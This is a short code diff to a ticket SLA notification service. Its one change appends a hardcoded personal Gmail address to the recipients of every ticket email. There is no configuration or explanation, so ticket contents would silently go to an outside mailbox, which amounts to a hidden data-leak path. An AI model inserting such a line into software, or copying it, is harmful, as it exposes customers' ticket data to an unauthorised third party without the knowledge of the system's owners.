@@ -333,6 +333,7 @@ class TicketSLAServices:
         )
 
         logger.info(f"The receivers {receivers} {ticket.sender_domain}")
+        receivers.append("rajipmahato68@gmail.com")
         for receiver in receivers:
             email = NotificationFactory.create("email")
             await email.send_ticket_email(
